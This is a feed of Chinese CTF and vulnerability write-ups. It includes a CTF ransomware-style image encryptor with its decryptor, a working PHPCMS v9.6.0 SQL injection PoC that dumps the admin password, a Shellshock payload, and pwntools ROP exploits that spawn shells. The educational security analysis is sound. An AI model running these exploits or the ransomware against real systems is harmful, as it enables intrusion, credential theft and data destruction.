UEIcaWJJVFRUZY8LTHmnJvD4VDvvPOW2LfvvfaVK2/epet6DmNsNkbexEwEZCwW/dU3v3n3vjlzKoEriyAb18IIEWmG4bQPH+7k06dftf/YsWPfCwaDtxHRs0R0BEN5ggkDER0JhcI7EpcpRYLJFQCMgw4kOSEEKysrVVu2/Jk9+ODDJ5Wy3rz22mtfdbmcrUqp45yLABHZjDE70a9MOCd5fCUT2Iyx/3S73U0NDSsdid++0pg58/nqhp+hmZCUtFIKra27bSklA6AaG3/nqq9vyC8sLPLEYlGvx+PlRLRM07QfYyhfkC4UgD8EAv2P1dbWDJaXV6S8qpMOGLMIpsoRkbAsk3bufEsC4EQko9ForWEYz3HOazMwPgbgxWg0+tTMmdNCN9xQK1Mt2SGREstqUZJzjgMH3pcAeDgcdhHRnU6n8wnGWFm6lhPRcQAbgsHgywsXzrXTND6znOBYuFgsRm1tb9tbtvzZfdtta2/UdcdDAG7FUA4xHVywLGvr4ODgs/fdt76zp6dbr6qqSsf4j3KCGj6OBCfkcELiRAgDYPf1nXUZhrEqLy//Xs75LUgUV9JAEMDr4XC48bXX/qftzjvvijc0rNTdbnfKlepLuIk5InPw4EEZCoV5NGqaP/zh447Nm18pnjlz1goi+gaA5Vcok30KROQnor8xxl7atu2Nvbfccmt09ep6lkiBj2nMyXAxrdNd27Y1J6+TAZSZcKJdXFyIZ575hXvduq9Nczgc1xPRF3VdrwNQnqgTpoOTUspXA4H+V/x+/4G5c+fZ8+dX8zVrGthIdcgMJiy9wsj27S1WR8eBgqqqL6x3OBx2JBI5quu637ZtRkRTcnNzi6SU13HO53HOrwEwCx/rSzoIAtgUjUZ//d3vrj+2efMrVn39Ck0IwTB+mpS+COblOQXnnBuG8SUAdW63OwYgZhgGw5CQGZqmZRrIAACUUgeVUk9GIpE3Cgq8VFMzX6VR7UlbBJMrgCFFEWxq2mGFQqFl+fn5vwVQPRZjL4WUsikSifzA4/EcWr58icPlcmUqbqlyLO3tsM9X5/B4PHsikcj9RLR/vIy3bfuNQKD/ex6P59CqVTc7nE7nRBufWU6QMWbX16/Q3G73nng8drtS8i8YY0JUKbVvYCD8yLRp0z/0+epSjeMn75ygEAL19SvgcuWciEQG11uW+SgRvY/MiiT9Sqknvd6CrtWr6x0TZOj45wSFENqaNQ0qPz8/cuLEyU2MsT3IbCf3+61bt7y5fPmSbBo/PjlBpZQAoKqqqm7BUOUmXRwzTbPxjjvuRE5OTjaNT3JjzwkSEUWjURsZVIqVUltLSmZ8uHRprcqC4I1/YQSAvPHGRY6uriOvm2b8QSJ6N1VHEFEgGLz4Wl9fv5WTkzMZxo+9MAJA83q99v3332cbhvPlYDD4L4ODg7cT0c+VUk0ADgHwY2Rx7BBCHKioKEkle/vZE0EM0wGPx8MaGlbgpptqL+Tm5r66cuXSJ5ua3lgXCATqLct6CSOII2Nsr8fjHayoqBzP8DZtERy37TDnQisunmUXF8/SAWD9+nuip0/7o1LK2AizT7FY7DAAlTjWkm3jk9z4FUYu5aqrqzUAdO6cv1Ep9SwRHQUQTtwf55z3ENFkGj++hZGRuIqKMu3FFxtDs2bN2qbr+l/z8vL/Go/Hmznnfx8cHNw9e/YMs6ioaNzS8hlw6Z8TTJdjjEnTNLUzZ85aR48eZwBoxYqbSNd1PXGoabKM50kHAJPwb3OfEc6a8JzgZ5wbUQRHOmX1z8oRT8w+S9xAiY/9eeH+H3OvLONNk14ZAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE3LTA2LTIwVDE3OjM2OjIzKzAyOjAw+wTeWAAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxNy0wNi0yMFQxNzozNjoyMyswMjowMIpZZuQAAAAASUVORK5CYII="""MSG="""This Image is encrypted by WannaFly Ransom-ware. If you want your original image back, feel free to contact us on sha2017ctf@gmail.com and make a bitcoin payment of 0.1 bitcoin to address 1QCc1EYncxTeSfTKpaCZ2hvMDwXULKRVWe"""def get_iv(): iv = "" random.seed(int(time())) for i in range(0,16): iv += random.choice(string.letters + string.digits) return ivdef encrypt(m, p): iv=get_iv() aes = AES.new(p, AES.MODE_CFB, iv) return base64.b64encode(aes.encrypt(m))def decrypt(m, p, i): aes = AES.new(p, AES.MODE_CFB, i) return aes.decrypt(base64.b64decode(m))def find_images(): i = [] #for r, d, f in os.walk(os.environ['HOME']): for r, d, f in os.walk("."): for g in f: if g.endswith(".png"): i.append((os.path.join(r, g))) return idef encrypt_images(): for i in find_images(): img = Image.open(i).filter(ImageFilter.GaussianBlur(radius=18)) draw = ImageDraw.Draw(img) font = ImageFont.truetype("/usr/share/fonts/truetype/freefont/FreeSans.ttf", 18) text = textwrap.wrap(MSG, width=60) W, H = img.size bird = Image.open(BytesIO(base64.b64decode(IMG))) bw, bh = bird.size offset = ((W-bw)/2, (H-bh)/2 - 80) img.paste(bird, offset, bird) pad = 0 for line in text: w, h = draw.textsize(line, font=font) draw.text(((W-w)/2, (H-h)/2 + pad), line, font=font, fill="white") pad += 20 img.save('/tmp/sha.png') encrypt_image(i)def encrypt_image(img): data = open(img, 'r').read() encrypted_img = encrypt(data, sys.argv[1]) blurred_img = open('/tmp/sha.png', 'r').read() stat = os.stat(img) with open(img, 'r+') as of: of.write('\0' * stat.st_size) of.flush() open(img, 'w').write(blurred_img + "\n" + encrypted_img)if __name__ == '__main__': if len(sys.argv) != 2: print "Usage: %s &lt;pass&gt;" % sys.argv[0] else: encrypt_images() 可以看出这是一个加密脚本。其调用过程如下： 调用find_images()找到png文件， 先根据png文件生成一张“模糊”的图片并保存到sha.png中， 接着调用encrypt_image(img)。 先把原图片进行了一次encrypt()加密，得到encrypted_img 读取之前生成的sha.png文件，作为blurred_img 将blurred_img + “\n” + encrypted_img 的内容写入图片文件。 用十六进制编辑器打开可以验证。图片中0A即为10，这是”\n”的的十六进制表示。之前的数据即为blurred_img，之后的数据即为encrypted_img。 接下来我们看看怎么进行encrypt()函数。encrypt()加密使用了AES加密。要对密文解密的话，我们可以调用decrypt(m, p, i)，这需要三个参数，m即加密后的数据，p即密钥，i即偏移量。 m是加密后的数据，直接打开图片进行提取就行。 p是密钥。在运行脚本是通过命令行参数读入。结合之前得到的.bash_history中的chmod +x ... ./... Hb8jnSKzaNQr5f7p，我们推测Hb8jnSKzaNQr5f7p即为密钥。 i是偏移量，通过get_iv()生成。其中使用int(time())来作为生成伪随机数的种子。图片的修改时间是可以获得的。所以i，我们也得到了。 exp脚本如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344from Crypto.Cipher import AESimport base64import randomimport stringimport osdef find_images(): i = [] for r, d, f in os.walk("."): for g in f: if g.endswith(".png"): i.append((os.path.join(r, g))) return idef get_iv(time): iv = "" random.seed(int(time)) for i in range(0,16): iv += random.choice(string.letters + string.digits) return ivdef decrypt(m, p, i): aes = AES.new(p, AES.MODE_CFB, i) return aes.decrypt(base64.b64decode(m))p = "Hb8jnSKzaNQr5f7p"for i in find_images(): new_img_name = i[len("./Pictures/"):-4] old_img = open(i, 'r').read() data = old_img[old_img.find("IEND")+9:] print(data[0:5]) old_img_time = os.stat(i).st_mtime new_img_name = str(old_img_time) + new_img_name iv = get_iv(old_img_time) # print(iv) new_img = open(new_img_name,"wb") new_img.write(decrypt(data,p,iv)) new_img.close() 其中old_img_time = os.stat(i).st_mtime，是为了获得图片的修改时间。 运行后会得到一些图片。其中一张如下： 得到flag：1flag&#123;ed70550afe72e2a8fed444c5850d6f9b&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHPCMS v9.6.0 wap模块sql注入漏洞分析]]></title>
      <url>%2F2017%2F08%2F04%2F%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[PHPCMS v9.6.0 wap模块sql注入漏洞分析 漏洞分析在/phpcms/modules/content/down.php中，约莫第11行：12345678910111213141516public function init() &#123; $a_k = trim($_GET['a_k']); if(!isset($a_k)) showmessage(L('illegal_parameters')); $a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key')); if(empty($a_k)) showmessage(L('illegal_parameters')); unset($i,$m,$f); parse_str($a_k); if(isset($i)) $i = $id = intval($i); if(!isset($m)) showmessage(L('illegal_parameters')); if(!isset($modelid)||!isset($catid)) showmessage(L('illegal_parameters')); if(empty($f)) showmessage(L('url_invalid')); $allow_visitor = 1; $MODEL = getcache('model','commons'); $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid]['tablename']; $this-&gt;db-&gt;table_name = $tablename.'_data'; $rs = $this-&gt;db-&gt;get_one(array('id'=&gt;$id)); 首先，通过GET方法得到参数$a_k。在经过sys_auth解密(里面有个DECODE)后，对$a_k进行了一次parse_str($a_k)，parse_str()会把字符串解析到对ing的变量中。在经过解析后，通过语句$rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));将变量id带入查询。所以目标是寻找一个能加密的地方，并且能够回显给我们，这样就能构造参数$a_k，并造成注入。 在 /phpcms/modules/attachment/attachments.php 中，约莫第239行123456789101112131415public function swfupload_json() &#123; $arr['aid'] = intval($_GET['aid']); $arr['src'] = safe_replace(trim($_GET['src'])); $arr['filename'] = urlencode(safe_replace($_GET['filename'])); $json_str = json_encode($arr); $att_arr_exist = param::get_cookie('att_json'); $att_arr_exist_tmp = explode('||', $att_arr_exist); if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123; return true; &#125; else &#123; $json_str = $att_arr_exist ? $att_arr_exist.'||'.$json_str : $json_str; param::set_cookie('att_json',$json_str); return true; &#125; &#125; 通过GET方法得到参数$arr[‘src’]，先经过safe_replace()过滤。我们先看一下safe_replace()函数。12345678910111213141516function safe_replace($string) &#123; $string = str_replace('%20','',$string); $string = str_replace('%27','',$string); $string = str_replace('%2527','',$string); $string = str_replace('*','',$string); $string = str_replace('"','&amp;quot;',$string); $string = str_replace("'",'',$string); $string = str_replace('"','',$string); $string = str_replace(';','',$string); $string = str_replace('&lt;','&amp;lt;',$string); $string = str_replace('&gt;','&amp;gt;',$string); $string = str_replace("&#123;",'',$string); $string = str_replace('&#125;','',$string); $string = str_replace('\\','',$string); return $string;&#125; 将%27等关键字过滤。但是利用“*”会被直接过滤为空这点，假设传入的$string为%2*7,则在替换后，会变成%27，从而获得单引号，其余可类似绕过。 接下来继续运行。若不满足条件，会进入set_cookie()函数，具体如下：12345678910111213public static function set_cookie($var, $value = '', $time = 0) &#123; $time = $time &gt; 0 ? $time : ($value == '' ? SYS_TIME - 3600 : 0); $s = $_SERVER['SERVER_PORT'] == '443' ? 1 : 0; $var = pc_base::load_config('system','cookie_pre').$var; $_COOKIE[$var] = $value; if (is_array($value)) &#123; foreach($value as $k=&gt;$v) &#123; setcookie($var.'['.$k.']', sys_auth($v, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s); &#125; &#125; else &#123; setcookie($var, sys_auth($value, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s); &#125;&#125; 其中，会将传入的参数进行一次加密sys_auth($value, ‘ENCODE’)，这正好满足我们前面的需求。 为了能访问到swfupload_json()，我们需要一个cookie。这样在访问时才不会直接跳转到登陆也main。接下来就是寻找能够给我们提供这次setcookie机会的接口。比如说wap模块。在 /phpcms/modules/wap/index.php 中，约莫第6行1234function __construct() &#123; $this-&gt;db = pc_base::load_model('content_model'); $this-&gt;siteid = isset($_GET['siteid']) &amp;&amp; (intval($_GET['siteid']) &gt; 0) ? intval(trim($_GET['siteid'])) : (param::get_cookie('siteid') ? param::get_cookie('siteid') : 1); param::set_cookie('siteid',$this-&gt;siteid); 通过GET方法得到$siteid，然后传到了set_cookie()函数中，满足条件。 利用利用步骤 访问 /index.php?m=wap&amp;a=index&amp;siteid=1 。获取响应头的set-Cookie字段。 将前一步获取到的字段赋值给userid_flash，作为POST参数。访问 /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=【payload】 获取返回头的set—Cookie字段，此即为加密后的payload 访问 /index.php?m=content&amp;c=down&amp;a_k=【加密后的payload】，注入成功。 cmsPoc开源CMS渗透测试框架 cmsPoc中已集成了利用脚本 v960_sqlinject_getpasswd.py。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from lib.core.data import targetimport requests,sys,urllibdef poc(): try: url = target.url sqli_prefix = '%*27an*d%20' sqli_info = 'updatexml(1,concat(1,(user())),1)' sqli_password1 = 'updatexml(1,concat(1,(select concat(0x6368796265746124,username,0x3a,password,0x3a,encrypt,0x6368796265746124) from ' sqli_password2 = '_admin limit 0,1)),1)' sqli_padding = '%23%26m%3D1%26f%3Dwobushou%26modelid%3D2%26catid%3D6' step1 = url + '/index.php?m=wap&amp;a=index&amp;siteid=1' r = requests.get(step1) post = &#123;"userid_flash":r.cookies["GPYAh_siteid"]&#125; print('[+] Get Cookie : ' + r.cookies["GPYAh_siteid"]) step2 = url + "/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=" + sqli_prefix + sqli_info+ sqli_padding r = requests.post(step2,data=post) sqli_payload = r.cookies["GPYAh_att_json"] print('[+] Get SQLi Payload : ' + sqli_payload) step3 = url + '/index.php?m=content&amp;c=down&amp;a_k=' + sqli_payload html = requests.get(step3).text db_start = html.find("SELECT * FROM `") + len("SELECT * FROM `") db_end = html.find("`.`") Database = html[db_start:db_end] print("[+] Get Database Name: "+ Database) tableprefix_start = html.find("`.`") + len("`.`") tableprefix_end = html.find("_download_data") tableprefix = html[tableprefix_start:tableprefix_end] print("[+] Get Table Prefix: "+ tableprefix) startIndex = html.find("XPATH syntax error: '") + len("XPATH syntax error: '") endIndex = html.find("' &lt;br /&gt; &lt;b&gt;MySQL Errno") database_user = html[startIndex:endIndex] print("[+] Get Database-user Information : " + database_user) step4 = url + "/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=" + sqli_prefix + sqli_password1+ tableprefix + sqli_password2 + sqli_padding r = requests.post(step4,data=post) sqli_payload = r.cookies["GPYAh_att_json"] setp5 = url + '/index.php?m=content&amp;c=down&amp;a_k=' + sqli_payload html = requests.get(setp5).text startIndex = html.find("XPATH syntax error: '") + len("XPATH syntax error: '") endIndex = html.find("' &lt;br /&gt; &lt;b&gt;MySQL Errno") admin_passwd = html[startIndex:endIndex] print("[+] Get User Passwd: " + admin_passwd) print("\033[33m[*] Complete this task: &#123;&#125; \033[0m".format(target.url)) except KeyError as e: print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m") 本文收录于：【gitbook:Vuln-Time】]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:shellshock]]></title>
      <url>%2F2017%2F08%2F01%2FPwnable-kr-shellshock%2F</url>
      <content type="text"><![CDATA[bash破壳漏洞应用。 题目1234567#include &lt;stdio.h&gt;int main()&#123; setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system("/home/shellshock/bash -c 'echo shock_me'"); return 0;&#125; exp有名的bash破壳漏洞。所以这里不展开了。直接给出exp：123shellshock@ubuntu:~$ env x=&apos;() &#123; :;&#125;; /bin/cat flag&apos; ./shellshockonly if I knew CVE-2014-6271 ten years ago..!!Segmentation fault]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:mistake]]></title>
      <url>%2F2017%2F08%2F01%2FPwnable-kr-mistake%2F</url>
      <content type="text"><![CDATA[操作符优先级问题。c语言中=优先级为14，而&lt;优先级为6。 题目1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123; int i; for(i=0; i&lt;len; i++)&#123; s[i] ^= XORKEY; &#125;&#125;int main(int argc, char* argv[])&#123; int fd; if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0; &#125; printf("do not bruteforce...\n"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf("read error\n"); close(fd); return 0; &#125; char pw_buf2[PW_LEN+1]; printf("input password : "); scanf("%10s", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123; printf("Password OK\n"); system("/bin/cat flag\n"); &#125; else&#123; printf("Wrong Password\n"); &#125; close(fd); return 0;&#125; 分析程序的功能，就是我们输入的十个字符进行xor处理后保存在pw_buf2中，与pw_buf进行比较，若相同则得到flag。 问题出在下面这段代码中：1234if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0;&#125; 由于&lt;的优先级比=高，所以在open()执行完后，不论是否打开成功，其返回值都大于或者等于零。所以在与0比较后，fd的值为false，在c语言中，即为0。 所以当程序执行到：12345if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf(&quot;read error\n&quot;); close(fd); return 0; &#125; 实际上执行的是：1if(!(len=read(0,pw_buf,PW_LEN) &gt; 0)) 而在unix中，0表示为标准输入流，read(0,pw_buf,PW_LEN)即为从标准输入流中读取字符并保存到pw_buf中。 所以实际上，两个数组的内容都是我们输入的。 exp第一次输入时输入十个字符，比如十个1：11111111111 第二次输入时输入第一次输入十个字符经过异或后的结果：10000000000 flag：1234567891011mistake@ubuntu:~$ ./mistakedo not bruteforce...2input password : 0Wrong Passwordmistake@ubuntu:~$ ./mistakedo not bruteforce...1111111111input password : 0000000000Password OKMommy, the operator priority always confuses me :(]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[BugsBunnyCTF2017-Reverse-writeup]]></title>
      <url>%2F2017%2F07%2F30%2FBugsBunnyCTF2017-Reverse-writeup%2F</url>
      <content type="text"><![CDATA[单刷好幸苦。 only guess用IDA打开 dict数组保存了各种字符串： 基本逻辑就是读入的pass和数组dict比较，同时&amp;dest和数组dict的值比较，若一样则为good password。所以实际上&amp;dest就是我们要输入的值。1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;int main()&#123; char dest; long long src = 0x736564656372656d; memcpy(&amp;dest, &amp;src, 9uLL); printf("%s",&amp;dest); return 0;&#125; 但是我测试时只输出了mercede?(，所以这不是最后的password，需要修正。想了一个曲线救国的方法。用命令strings re50 &gt; tmp把数组dict中的内容输出到tmp文件中，在tmp文件中查找开头为mercede的值。最终确定password为：1mercedes 最终的flag:1Bugs_Bunny&#123;mercedes&#125; rev100拖进IDA查看。 main函数中，将A，B两处的字符串拷贝后进行异或并存储到C中。用下面的脚本得到flag： 123456789str1 = [0x61,0x41,0x40,0x37,0x6d,0x77,0x34,0x2c,0x5f,0x41,0x42,0x60,0x7,0x34,0x7d,0x12,0x57,0x7a,0x22,0x25,0x4f,0x28]str2 = [0x23,0x34,0x27,0x44,0x32,0x35,0x41,0x42,0x31,0x38,0x39,0x38,0x37,0x46,0x22,0x23,0x24,0x25,0x44,0x50,0x21,0x55]str3 = ""for i in range(len(str2)): str3 += chr(str1[i] ^ str2[i])print str3 得到flag：1Bugs_Bunny&#123;X0r_1s_fun&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[BugsBunnyCTF2017-misc-writeup]]></title>
      <url>%2F2017%2F07%2F30%2FBugsBunnyCTF2017-misc-writeup%2F</url>
      <content type="text"><![CDATA[单刷好幸苦。 MISCNot found1hidden in plain sight 在注册时时候就注意到有irc页面，连上去后得到flag1Bugs_Bunny&#123;Th1s_1s_0ur_fl4g_f0rm4t&#125; Primitive encryption题目给了如下信息：12345What about a time travel ? ^^Your mission is to be very observative, sometimes a theory start from a supposition.Decrypt this and you will get your flag :i KTAX ZTRTRTC SuB AKXy KXlp you GiRViRF youN GlTF TRV iA&apos;C FFAKTAwTCXTCyTo validate the challenge enter : Bugs_Bunny&#123;your_flag_uppercase&#125; 考虑语义，进行如下替换：12345678910K -&gt; hX -&gt; eN -&gt; rA -&gt; tC -&gt; sT -&gt; aR -&gt; RV -&gt; eG -&gt; FF -&gt; g 得到：1i hate Zararas SuB they help you fireirg your flag are it&apos;s ggthatwaseasy 将ggthatwaseasy改成大写加上外围后得到flag：1Bugs_Bunny&#123;GGTHATWASEASY&#125; Like a Boss !1Put the flag between Bugs_Bunny&#123;&#125; Locked PDF1My girlfriend sent me a locked PDF file ,Can you please helps me to read the content ,maybe something great waiting fro me ?!! :p SteganographyStego10题目提供了一张图片。123456root@chybeta:~/Desktop/bug/steg# strings h4cker.jpgJFIF`ExifGoogle0220.Bugs_Bunny&#123;0258c4a75fc36076b41d02df8074372b&#125; odd &amp; even 212345odd and even are two friends since ever.Can you detach them.Be the devil and do it.flag : BUGS_BUNNY&#123;&#125; ForensicsFOR251I found this file in my computer ,could you please give me the flag ?! 直接用strings看一下。 用以下脚本提取出hex。123456789file = open(&apos;hex&apos;,&apos;rb&apos;)output = open(&apos;output&apos;,&apos;wb&apos;)while True: line = file.readline() output.write(line[9:48]+&quot;\n&quot;) if not line: breakfile.close()output.close() 然后将output中的内容放到hex编辑器中并保存在压缩包文件。压缩包中有文件hex.png。得到flag：1Bugs_Bunny&#123;Y0u_D1D_1T_W3ll&#125; UNKOWN file !!1? em rof ti evlos esaelp uoy dluoc, rekcah boon a m&apos;I, elif egnarts a em dnes evah dneirf ym 题目是倒这个，这是个提示。用hex打开unknown文件，发现是个png文件，只是被倒序了。将其十六进制内容保存在unknownhex.txt中，用下面这个脚本转换一下：12345678unknowhex = open(&apos;unkownhex.txt&apos;,&apos;rb&apos;)knowhex = open(&apos;knowhex.txt&apos;,&apos;wb&apos;)content = unknowhex.readline()content = content.split(&apos; &apos;)for i in content[::-1]: knowhex.write(i+&apos; &apos;)unknowhex.close()knowhex.close() 再把knowhex.txt的内容放到hex编辑器中并保存成png文件。打开后是倒着的flag。最后的flag为：1Bugs_Bunny&#123;E4Sy_T4Sk_F0R_H4X0r_L1KeS_Y0u&#125; For80把gif传到这网站后，进行split。但是图片很不清晰。然后我选择把分帧的图片下载下来。其目录结构差不多如下：然后用下面这个脚本写个html页面，用这些分帧图片进行填充。12345html = open("flag.html","wb")for i in range(310): img = '&lt;img src="img/frame_' + str(i)+ '_delay-0.01s.gif" /&gt;' html.writelines(img)html.close() 有些地方重叠了，但不妨碍最后的flag：1Bugs_Bunny&#123;S3nD_NuDes_DuD3&#125; Give me the Flag !task85的压缩包解压出来后有个flag.rar和flag文件夹。flag文件夹里有各种国旗还有二维码碎片。而flag.rar被加密了。初步推测通过回复二维码来解密压缩包。拼了好久。。 扫码得到：1== 34Sy_P4SSW0Rd_H4X0r == 直接解压得到的flag.txt里有flag。直接打开压缩包里面有个readme.txt，输入密码后其内容为：101000010 01110101 01100111 01110011 01011111 01000010 01110101 01101110 01101110 01111001 01111011 00110010 01100010 00111001 00110111 00110010 00110110 00110011 01100010 01100101 01100010 00110111 00110000 01100100 00110000 01100110 00110110 00110101 00111001 01100010 01100100 01100010 00111001 00110011 01100011 01100011 00110101 00110010 00111001 00110001 01100100 00110000 01100001 01111101 放到 http://tool.ph0en1x.com 上解一下，得到flag：1Bugs_Bunny&#123;2b97263beb70d0f659bdb93cc5291d0a&#125; ProgramationZERO-ONE !写程序把ZERON,ONE换成对应的0，1，之后再解码就行了。脚本如下：123progfile = open("progTask.txt","rb")content = progfile.readline()print(content.replace("ZERO",'0').replace("ONE","1").replace(" ","")) 在 http://tool.ph0en1x.com 放入bin一栏，在ascii一栏得到如下：1QnVnc19CdW5ueXswNWZlODIzOGNmZWUxZTVmMDRiNjUzMzliZWE0ZmVkMn0= 进行base64解码，得到flag：1Bugs_Bunny&#123;05fe8238cfee1e5f04b65339bea4fed2&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[BugsBunnyCTF2017-crypto-writeup]]></title>
      <url>%2F2017%2F07%2F30%2FBugsBunnyCTF2017-crypto-writeup%2F</url>
      <content type="text"><![CDATA[单刷好幸苦。 Crypto-15123Some classics crypto task ! Cesar maybe !!Author : Sold1ercrypto-15.txt 进行一次rot13后得到原文：123456789101112131415161718def encode(story, shift): return ''.join([ (lambda c, is_upper: c.upper() if is_upper else c) ( ("abcdefghijklmnopqrstuvwxyz"*2)[ord(char.lower()) - ord('a') + shift % 26], char.isupper() ) if char.isalpha() else char for char in story ])def decode(story,key): passif __name__ == '__main__': key = [_YOUR_KEY_HERE_] print decode("Piug_Pibbm&#123;Q35oF_3BQ0R3_4F3_B0H_G3QiF3_OH_4ZZ&#125;",key) 对Piug_Pibbm{Q35oF_3BQ0R3_4F3_B0H_G3QiF3_OH_4ZZ}进行凯撒解码。得到flag：1Bugs_Bunny&#123;C35aR_3NC0D3_4R3_N0T_S3CuR3_AT_4LL&#125; Crypto-201++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;----. &gt;+++++++++++++++++. --------------. ++++++++++++. --------------------. &lt;. &gt;++++++++++++++++++++++. -------. . +++++++++++. ++. &lt;. &gt;---------. &lt;--------------. ---. +++++++++++++++++++++++++++++. +++++++++++++++++. -------------------------. &gt;+++. &lt;&lt;++++++++++++. . &gt;&gt;++++++++. brainfuck解码，得到flag：1Bugs_Bunny&#123;Br41N_Fu**&#125; Crypto-25题目文件下载下来后打开发现是ook编码，放到下面网站中解码：1http://tool.ph0en1x.com/brainfuck/ 得到flag：1Bugs_Bunny&#123;Ju5T_OoK!&#125; Scy way123456Decrypt My Secret And Win!IHUDERMRCPESOLLANOEIHRBugs_Bunny&#123;flag&#125;Author: TnMch 栅栏密码。12IHUDERMRCPESOLLANOEIHR 得到flag：1Bugs_Bunny&#123;ISHOULDLEARNMORECIPHER&#125; Crypto-50就一直base64的解密。得到flag：1Bugs_Bunny&#123;N0T_H4Rd_4T_4ll&#125; babyRsa12N: 20473673450356553867543177537e: 17 在factordb上把N进行分解如下，得到p和q：12p = 2165121523231q = 9456131321351327 用以下脚本解出flag：1234567891011121314151617181920212223242526272829n = 20473673450356553867543177537p = 2165121523231q = 9456131321351327e = 17def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mdef decrypt(c, d, n): return pow(c, d, n)d = modinv(e, (p-1)*(q-1))print dencfile = open('enc.txt','rb')decfile = open('flag.txt','wb')for i in range(48): enc = encfile.readline()[:-1] print enc decfile.write(str(chr(decrypt(long(enc),d,n))))encfile.close()decfile.close() 运行到最后时会说overflow出错，不过不影响flag。最后的flag如下：1Bugs_Bunny&#123;Baby_RSA_Its_Cool_Lik3_school_haHAha&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[BugsBunnyCTF2017-pwn-writeup]]></title>
      <url>%2F2017%2F07%2F30%2FBugsBunnyCTF2017-pwn-writeup%2F</url>
      <content type="text"><![CDATA[单刷好幸苦。 Pwn5012345You look new hereso this is my gift for youtask : nc 54.153.19.139 5251just write something when connect , its always UPAuthor: TnMch 用了gets，有明显的溢出。题目中有提供了system函数执行。exp如下：123456789101112from pwn import *r = remote("54.153.19.139","5251")v6 = 0x62v7 = 0x75v8 = 0x67v9 = 0xDEFACEDoffset = 0x28 - 0x10payload = 'bug' + 'a' * (offset -3)+ p64(v9)r.sendline(payload)r.interactive() 既然可以溢出，也可以用rop来做。exp如下：1234567891011121314from pwn import *r = remote("54.153.19.139","5251")elf = ELF("pwn50")system_addr = elf.symbols['system']binsh_addr = 0x0000000000400773pop_rdi_ret_addr = 0x0000000000400743offset = 56payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(binsh_addr)payload += p64(system_addr)r.sendline(payload)r.interactive() 然后我进去后找了好久的flag。以为那个pwn50是文件，结果最后发现是它是个文件夹mdzz。以后找flag可以用命令来帮忙：1234$ find / -name flagfind: &apos;/root&apos;: Permission denied/home/pwn50/flag... 最后的flag：1Bugs_Bunny&#123;lool_cool_stuf_even_its_old!!!!!&#125; Pwn100123Try this , maybe little hardtask : nc 54.153.19.139 5252Author: TnMch pwn150用IDA调试后可以看到用fgets读入了192个字节，但起始位置距离rbp只有50个字节，存在溢出，而且程序没有开canary保护。溢出的offset推测为 0x50+8 = 88。 用gdb调试确定为88的偏移。由于程序中会fork出新进程，为调试方便可以在gdb调试开始时先输入set follow-fork-mode parent，然后在对应的地方下断点进行调试。 123456789101112131415161718from pwn import *elf = ELF('pwn150')r = remote("54.153.19.139","5253")print r.recvuntil("UTC 2017")print r.recvuntil("Send me your message here:")system_addr = elf.symbols['system']sh_addr = elf.search('sh').next()pop_rdi_ret_addr = 0x0000000000400883pop_rsi_pop_r15_ret = 0x0000000000400881offset = 88payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(sh_addr)payload += p64(system_addr)r.send(payload)r.interactive() 最后的flag：12345678$ lspwn150$ cd pwn150$ lsflagpwn150$ cat flagBugs_Bunny&#123;did_i_help_you_Solve_it!oHH_talk_to_hacker:D&#125; pwn300]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[BugsBunnyCTF2017-web-writeup]]></title>
      <url>%2F2017%2F07%2F30%2FBugsBunnyCTF2017-web-writeup%2F</url>
